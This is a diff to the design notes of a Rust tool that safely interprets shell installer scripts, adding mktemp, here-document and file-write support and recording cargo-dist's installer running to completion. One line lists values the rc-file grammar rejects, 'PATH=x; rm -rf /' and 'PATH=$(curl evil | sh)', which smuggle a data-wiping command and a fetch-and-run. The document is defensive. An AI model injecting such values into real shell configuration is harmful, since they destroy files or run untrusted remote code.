@@ -195,10 +195,16 @@ src/
                boundary). `test`/`[ ]` and `case` matching are evaluated
                natively with no side effects. The native builtins live
                here too — `local`, `shift`, `unset`, `command -v`/`type`,
-               `cd`, `read`/`true` from `< /dev/tty`, `set -u` as a real
-               toggle — alongside `cat << EOF` here-doc banners and the
-               `> /dev/null`/`2>&1`/`>&2` redirect shapes. Shells and the
-               reopen-a-shell builtins (`eval`, `exec`, `source`) stay
+               `cd`, native `mktemp`/`mktemp -d` (recorded in the
+               ledger, so a later `rm -rf` of the temp tree is allowed),
+               `read`/`true` from `< /dev/tty`, `set -u` as a real
+               toggle — alongside here-documents (`cat << EOF` printed,
+               written to a file with `>`, or `read VAR << EOF` binding
+               the first line; a here-doc fed to a *function call*
+               becomes that call's stdin), a create-only `> file` write
+               (PLAN's write/create row: new or run-owned path, overwrite
+               governed by `overwrite`), and the `> /dev/null`/`2>&1`/
+               `>&2` redirect shapes. Shells and the
                hard-denied. Anything still unimplemented (background jobs
                `&`, `VAR=value cmd` prefix assignment, most redirect
                targets, array/ANSI-C/glob expansion, ...) is denied here —
@@ -212,17 +218,21 @@ src/
                the documented schema.
   exec.rs      Native implementations of allowed operations. The policy
                compiles each allowed statement into a closed `Action`
-               enum (Print, MkDir, Remove, Chmod, Copy, Fetch,
-               AppendFile, Sha256Sum, Sha256Check, Subprocess,
-               DefineFunction, Test, Assign, DeclareLocal, Shift, Unset,
-               SetNounset, ProbeRead, ChangeDir, ReadLine, CommandLookup,
-               Noop); exec runs actions in Rust — echo/printf rendering
-               (with `%b`/octal escapes), dir creation, ledger-checked
-               rm/chmod, native `cp` (governed by `overwrite`, like
-               `curl -o`/`wget -O`), GET fetches via an in-process,
-               timeout- and redirect-bounded HTTP client (ureq) that
-               refuses to downgrade an https:// fetch to plaintext on
-               redirect, restricted-grammar rc-file appends, native
+               enum (Print, MkDir, MkTemp, Touch, Remove, Chmod, Copy,
+               Fetch, AppendFile, WriteFile, Sha256Sum, Sha256Check,
+               Subprocess, DefineFunction, Test, Assign, DeclareLocal,
+               Shift, Unset, SetNounset, ProbeRead, ChangeDir, ReadLine,
+               CommandLookup, Noop); exec runs actions in Rust —
+               echo/printf rendering (with `%b`/octal escapes), dir
+               creation, `mktemp` (exclusive-create loop, ledger-owned),
+               ledger-checked rm/chmod, native `cp` (governed by
+               `overwrite`, like `curl -o`/`wget -O`), create-only
+               `> file` writes (same overwrite ladder), GET fetches via
+               an in-process, timeout- and redirect-bounded HTTP client
+               (ureq) that refuses to downgrade an https:// fetch to
+               plaintext on redirect, restricted-grammar rc-file appends
+               (including a captured function call's whole stdout —
+               cargo-dist's `ensure cat <<EOF >> rcfile`), native
                SHA-256 compute/verify, direct fork/exec (never a shell)
                of the subprocess tier's literal argv — with the
                statement's own stdout/stderr redirects and, in a
@@ -246,9 +256,11 @@ src/
                run — the source of truth for "may delete / may chmod /
                may run" — plus the function table, global variables, the
                `set -u` flag, and a stack of call frames (each carrying a
-               function call's positional parameters and its `local`
-               declarations, so `$1`/`$@`/`$#` and dynamically-scoped
-               `local` resolve correctly).
+               function call's positional parameters, its `local`
+               declarations, and any here-document fed to the call as
+               stdin, so `$1`/`$@`/`$#` and dynamically-scoped `local`
+               resolve correctly and a `read`/`cat` inside the call
+               consumes that stdin rather than the script's own).
 ```
 
 Execution model: **interleaved** (decided). Installers branch on
@@ -343,19 +355,36 @@ doubles as the integration-test corpus later.
    sequentially with each stage's stdout buffered as the next stage's
    stdin), `! pipeline` negation, and the builtins installers reach for
    (`local`, `return`/`exit`/`shift`/`unset`, `command -v`/`type`,
-   native `cd`, and `read`/`true` from `< /dev/tty`) are all implemented
-   now, along with here-documents (`cat << EOF` banners), `> /dev/null`/
-   `2>&1`/`>&2` redirects, and the `%b`/octal `printf` escapes. `set -u`
-   is honored as a real toggle (unset expands to empty by default, bash's
-   behavior, and is refused only after the script itself opts in).
-   `curl … | sh` is handled as a sub-context ("sub-iish", see the Core
-   principle above) rather than refused, so even atuin's pipe-into-a-shell
-   bootstrap runs its producer and would interpret the fetched second
-   stage. With all of that in place every one of the seven curated corpus
-   installers now runs its *entire* platform-detection and setup logic
-   and stops only at a genuine external boundary — the network (downloads,
-   under `--network none` — including the second-stage fetch atuin's
-   `curl … | sh` now reaches), an interactive `/dev/tty` prompt, or the
+   native `cd`, native `mktemp`/`mktemp -d`, and `read`/`true` from
+   `< /dev/tty`) are all implemented now, along with here-documents
+   (`cat << EOF` printed, `cat << EOF > file` written, `read VAR << EOF`
+   bound, and a here-doc fed to a function call as its stdin — the shape
+   cargo-dist's `ensure cat <<EOF > script` wrapper uses), a create-only
+   `> file` write (PLAN's write/create row, overwrite governed by
+   `overwrite`), `> /dev/null`/`2>&1`/`>&2` redirects, and the `%b`/octal
+   `printf` escapes. The env-file append grammar also accepts a quoted
+   `. "$HOME/…"` source line (cargo-dist writes the rc line that way) and
+   recognizes fish's `config.fish`/`conf.d/*.fish` as startup files, and
+   `sha256sum -b` is accepted. `set -u` is honored as a real toggle
+   (unset expands to empty by default, bash's behavior, and is refused
+   only after the script itself opts in). `curl … | sh` is handled as a
+   sub-context ("sub-iish", see the Core principle above) rather than
+   refused, so atuin's pipe-into-a-shell bootstrap runs its producer and
+   interprets the fetched second stage — cargo-dist's ~1650-line
+   installer, which **now runs to completion**: it downloads the release
+   tarball and updater, verifies the SHA-256, unpacks and installs the
+   binary under `~/.atuin/bin`, writes the PATH env script and the
+   install receipt, and appends the source line to the shell rc files,
+   leaving a working `atuin` on disk. (atuin's *first*-stage post-install
+   shell integration still stops on its `eval "$(atuin init zsh)"` rc
+   append — that `eval "$(<tool> init <shell>)"` shape is deliberately
+   outside the restricted append grammar and needs a policy decision, not
+   an interpreter gap.) With all of that in place every one of the seven
+   curated corpus installers runs its *entire* platform-detection and
+   setup logic and stops only at a genuine external boundary — the
+   network (downloads, under `--network none` — including the
+   second-stage fetch atuin's `curl … | sh` now reaches), an interactive
+   `/dev/tty` prompt, the out-of-grammar `eval` rc append above, or the
    one still-unimplemented construct (background jobs, `&`, which nvm uses
    to parallelize its downloads).
    `scripts/verify-installers.sh` (Docker-isolated,
@@ -372,10 +401,16 @@ doubles as the integration-test corpus later.
    self-check or adversarial case) fails it. The completed-install path
    is exercised for real today by the harness self-check (a synthetic
    offline installer that runs to completion and whose installed program
-   is then verified) and by an end-to-end `tests/cli.rs` case that drives
-   a realistic download-based installer — functions, `case` detection,
-   `local`, a `for` loop, a real (local-HTTP) download, `chmod +x`, and a
-   PATH export — all the way to a working program. If/when a real corpus
+   is then verified) and by two end-to-end `tests/cli.rs` cases: one
+   drives a realistic download-based installer — functions, `case`
+   detection, `local`, a `for` loop, a real (local-HTTP) download,
+   `chmod +x`, and a PATH export — all the way to a working program, and
+   a second drives a cargo-dist-shaped installer (atuin's second stage in
+   miniature) exercising every construct milestone 7 most recently added:
+   a here-doc-redirected function call that writes the env script, a
+   `mktemp -d` staging dir the ledger owns (so its `rm -rf` cleanup is
+   allowed), a `>`-written receipt, and the quoted `. "$HOME/…"` rc
+   append — again to a working, executable tool. If/when a real corpus
    script ever runs to completion (e.g. once the harness grows a local
    payload mirror for the offline-completable ones), the same paired
    verify command decides pass/fail for real. The same script
@@ -398,7 +433,9 @@ doubles as the integration-test corpus later.
    PATH=x; rm -rf /`, `PATH=$(curl evil | sh)`): the value must be a
    single word, since a later shell *sources* the rc file. *(in progress
    — every curated corpus installer now runs its full logic and stops only
-   at an external boundary or background jobs; the completed-install path
-   is proven by the self-check and an end-to-end download-installer test)*
+   at an external boundary or background jobs; atuin's second-stage
+   cargo-dist installer runs all the way to a working binary once its
+   downloads are reachable; the completed-install path is proven by the
+   self-check and two end-to-end download-installer tests)*
 8. **Sandboxing investigation** — Landlock/seccomp/Seatbelt for second
    stages (post-first-iteration).
